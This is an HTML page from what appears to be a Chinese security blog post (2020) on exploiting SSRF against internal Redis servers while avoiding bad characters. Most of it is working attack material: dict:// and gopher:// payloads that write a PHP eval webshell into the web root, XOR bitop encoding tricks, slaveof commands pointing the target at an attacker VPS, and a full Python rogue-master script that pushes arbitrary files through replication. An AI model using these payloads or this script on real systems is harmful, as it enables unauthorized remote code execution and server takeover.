@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="SSRF打Redis规避坏字符"/><meta name="keywords" content="research,analyze" /><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://hosch3n.github.io/2020/09/25/SSRF打Redis规避坏字符/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180953397-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180953397-1');
+</script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>SSRF打Redis规避坏字符 - Blog</title>
+  <meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            标签
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">SSRF打Redis规避坏字符
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-09-25
+        </span><span class="post-category">
+            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E8%BF%90%E7%AE%97"><span class="toc-text">位运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher"><span class="toc-text">Gopher</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">主从同步数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E6%96%87%E4%BB%B6"><span class="toc-text">主从同步文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><p>用dict协议通过SSRF间接打Redis的时候，数据中存在<code>:</code>、<code>&#39;</code>等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。</p>
+<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>对存在特殊字符的数据进行位运算，再在目标Redis上通过位运算将数据还原回来。<a target="_blank" rel="noopener" href="https://redis.io/commands/bitop">举个栗子</a>：</p>
+<p><img src="/img/ssrfdredisgbhzf_a.png"></p>
+<ol start="0">
+<li>利用抑或的特性先set两个不会与dict协议冲突的字符串</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/set:c:&quot;|\x7f&#125;%6!,hd\x1f\a\x05\x14\x1byqq\x1di&#123;\x7f~&quot;</code></p>
+<p><code>dict://127.0.0.1:6379/set:b:&#39;@@@@@@@@@@@@@@@@@@@@@@&#39;</code></p>
+<ol>
+<li>再在目标上还原</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/bitop:xor:a:b:c</code></p>
+<ol start="2">
+<li>设置RDB文件的保存路径为Web根目录</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p>
+<ol start="3">
+<li>设置RDB文件的保存文件名</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p>
+<ol start="4">
+<li>持久化保存</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/bgsave</code></p>
+<p><img src="/img/ssrfdredisgbhzf_b.png"></p>
+<h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><p>对redis-cli的命令数据抓包，利用gopher协议封装后重放给目标Redis。由于Redis的授权认证只有简单的一串<code>*2%0A%244%0Aauth%0A%248%0Afoobared</code>，且可以通过管道操作一次同时传输多条命令，因此这个方法还可以用来打知道密码的内网Redis。</p>
+<ol start="0">
+<li>监听环回口6379端口并抓包</li>
+</ol>
+<p><code>sudo tcpdump port 6379 -i lo -w redis.pcap</code></p>
+<p><img src="/img/ssrfdredisgbhzf_c.png"></p>
+<ol>
+<li>用gopher协议编码封装</li>
+</ol>
+<p><code>gopher://127.0.0.1:6379/_%244%0d%0aauth%0d%0a%248%0d%0afoobared%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0aa%0d%0a%2422%0d%0a%3C%3F%3Deval(%24_GET%5B911%5D)%3B%3F%3E%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2414%0d%0a%2Fvar%2Fwww%2Fhtml%2F%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0atmp.php%0d%0a*1%0d%0a%246%0d%0abgsave</code></p>
+<ol start="2">
+<li>对数据体URL编码后发给目标</li>
+</ol>
+<p><code>?url=gopher://127.0.0.1:6379/_%25244%250d%250aauth%250d%250a%25248%250d%250afoobared%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250aa%250d%250a%252422%250d%250a%253C%253F%253Deval(%2524_GET%255B911%255D)%253B%253F%253E%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252414%250d%250a%252Fvar%252Fwww%252Fhtml%252F%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25247%250d%250atmp.php%250d%250a*1%250d%250a%25246%250d%250abgsave</code></p>
+<p>如果嫌麻烦也可以用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">gopherus</a>交互式生成payload，同样需要二次编码后再打，<code>auth</code>开头的验证信息也要手动加一下</p>
+<h2 id="主从同步数据"><a href="#主从同步数据" class="headerlink" title="主从同步数据"></a>主从同步数据</h2><p>将数据通过redis-cli写入VPS的Redis，让目标通过主从同步加载数据。</p>
+<ol start="0">
+<li><p>在VPS上通过redis-cli写入数据</p>
+</li>
+<li><p>在目标上设置主从同步</p>
+</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p>
+<ol start="2">
+<li>设置RDB文件的保存路径为Web根目录</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p>
+<ol start="3">
+<li>设置RDB文件的保存文件名</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p>
+<ol start="4">
+<li>持久化保存</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/bgsave</code></p>
+<ol start="5">
+<li>断开主从同步</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p>
+<h2 id="主从同步文件"><a href="#主从同步文件" class="headerlink" title="主从同步文件"></a>主从同步文件</h2><p>r35tart师傅将Redis主从同步RCE的脚本 <a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 改了一下实现了无杂质写文件，这是一个主动连目标Redis打的脚本。</p>
+<p>脚本耦合度不高只要把一些主动打的功能删掉就可以了，然后利用SSRF手动发包即可。</p>
+<ol start="0">
+<li>准备要无损写的文件，在VPS上执行脚本</li>
+</ol>
+<p><code>python3 ssrf-redis-writefile.py --lhost=1.1.1.1 --lport=6379 --lfile=test.txt</code></p>
+<ol>
+<li>设置RDB文件的保存路径为Web根目录</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p>
+<ol start="2">
+<li>设置RDB文件的保存文件名</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p>
+<ol start="3">
+<li>在目标上设置主从同步</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p>
+<ol start="4">
+<li>断开主从同步</li>
+</ol>
+<p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p>
+<p>如果要用过认证或者是希望一把梭打完，就抓下包封装下gopher协议，道理是一样的。</p>
+<blockquote>
+<p>但是在Redis中，为了防止http协议对Redis端口的攻击，它如果检测到”POST”或者”Host:”，就会中断这次连接，并且在日志中留下这行，我们可以通过添加%00绕过<br>但是Redis是一边判断一边逐行执行，所以只要在读到”Host:”之前把需要的操作做完即可，所以不加也没关系</p>
+</blockquote>
+<ul>
+<li>附脚本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">CLRF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author: hosch3n</span></span><br><span class="line"><span class="string">Reference: https://github.com/r35tart/RedisWriteFile/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;*&quot;</span>):</span><br><span class="line">        raw_arr = cmd.strip().split(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> raw_arr[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;$&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> cmd.split(<span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cmd.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">msg</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[1;32;40m[info]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">din</span>(<span class="params">sock, cnt=<span class="number">4096</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    msg = sock.recv(cnt)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line">    <span class="keyword">return</span> msg.decode(<span class="string">&#x27;gb18030&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dout</span>(<span class="params">sock, msg</span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    <span class="keyword">if</span> type(msg) != bytes:</span><br><span class="line">        msg = msg.encode()</span><br><span class="line">    sock.send(msg)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RogueServer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lhost, lport</span>):</span></span><br><span class="line">        self._host = lhost</span><br><span class="line">        self._port = lport</span><br><span class="line">        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, self._port))</span><br><span class="line">        self._sock.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        cmd_arr = decode_cmd(data)</span><br><span class="line">        resp = <span class="string">&quot;&quot;</span></span><br><span class="line">        phase = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PING&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+PONG&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;REPLCONF&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+OK&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PSYNC&quot;</span>) <span class="keyword">or</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;SYNC&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + str(len(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            phase = <span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> resp, phase</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self</span>):</span></span><br><span class="line">        cli, addr = self._sock.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = din(cli, <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            resp, phase = self.handle(data)</span><br><span class="line">            dout(cli, resp)</span><br><span class="line">            <span class="keyword">if</span> phase == <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runserver</span>(<span class="params">lhost, lport</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rogue = RogueServer(lhost, lport)</span><br><span class="line">        rogue.exp()</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        rogue.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[1;31;m[-]\033[0m 发生错误！ : &#123;&#125; \n[*] Exit..&quot;</span>.format(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lhost&quot;</span>, dest=<span class="string">&quot;lh&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server ip&quot;</span>, metavar=<span class="string">&quot;LOCAL_HOST&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, type=<span class="string">&quot;int&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server listen port, default 6379&quot;</span>, default=<span class="number">6379</span>,</span><br><span class="line">            metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lfile&quot;</span>, dest=<span class="string">&quot;lfile&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;Local file that needs to be written&quot;</span>, metavar=<span class="string">&quot;Local_File_Name&quot;</span>, default=<span class="string">&#x27;dump.rdb&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--verbose&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>,</span><br><span class="line">            help=<span class="string">&quot;Show full data stream&quot;</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">global</span> verbose, payload, filename</span><br><span class="line">    localfile = options.lfile</span><br><span class="line">    verbose = options.verbose</span><br><span class="line">    payload = open(localfile, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        runserver(options.lh, options.lp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        info(repr(e))</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA">一次“SSRF–&gt;RCE”的艰难利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181599#h2-2">浅析SSRF认证攻击Redis</a></p>
+<p><a target="_blank" rel="noopener" href="http://r3start.net/index.php/2020/05/09/683">通过 SSRF 操作 Redis 主从复制写 Webshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/">2020 GACTF web</a></p>
+
+      </div>
+      
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/Redis/">Redis</a>
+            <a href="/tags/bitop/">bitop</a>
+            <a href="/tags/slaveof/">slaveof</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">TP5漏洞分析SQL注入篇</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2020/09/04/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">
+        <span class="next-text nav-default">PHP文件包含与条件竞争</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hosch3n@protonmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/hosch3n" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2021 - 2022<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">hosch3n</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
